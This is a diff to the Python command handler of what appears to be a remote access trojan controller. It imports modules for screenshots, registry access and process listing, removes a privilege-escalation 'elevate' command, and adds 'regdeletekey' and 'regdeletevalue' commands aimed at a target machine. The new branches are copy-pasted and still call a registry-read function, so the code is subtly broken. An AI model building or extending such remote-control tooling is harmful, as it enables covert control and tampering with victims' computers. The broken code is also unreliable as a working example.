@@ -11,8 +11,6 @@ from RAT_Py_DeleteFile import *
 from RAT_Py_Screenshot import * 
 from RAT_Py_Registry import *
 from RAT_Py_Process import *
-from RAT_Py_Elevate import *
-#from scapy.all import * # switch from socket to scapy for custom TCP packets
 
 SUCCESS = 1
 FAILURE = 0
@@ -150,13 +148,37 @@ def handleInput(ip, port):
 
             regRead(sock, keyPath, value)
 
+
+        elif (userInput == "regdeletekey"):
+            #printRegDeleteHelp()
+            user_input = input("> ")
+            parser = argparse.ArgumentParser(description='Delete a registry key off target')
+            parser.add_argument('-keypath', '--keypath', type=str, help='Path to the registry key we''re reading', action='store', required=True)
+            parser.add_argument('-value', '--value', type=str, help='Name of the value we want to read', action='store', required=True)
+            args = parser.parse_args(user_input.split())
+
+            keyPath = bytes(args.keypath, 'utf-8')
+            value = bytes(args.value, 'utf-8')
+
+            regRead(sock, keyPath, value)
+
+        elif (userInput == "regdeletevalue"):
+            #printRegDeleteHelp()
+            user_input = input("> ")
+            parser = argparse.ArgumentParser(description='Delete a registry key off target')
+            parser.add_argument('-keypath', '--keypath', type=str, help='Path to the registry key we''re reading', action='store', required=True)
+            parser.add_argument('-value', '--value', type=str, help='Name of the value we want to read', action='store', required=True)
+            args = parser.parse_args(user_input.split())
+
+            keyPath = bytes(args.keypath, 'utf-8')
+            value = bytes(args.value, 'utf-8')
+
+            regRead(sock, keyPath, value)
+
         elif (userInput == "processlist"):
             printProcessListHelp()
             processList(sock)
 
-        elif (userInput == "elevate"):
-            printElevateHelp()
-            elevate(sock)
             
     return
 
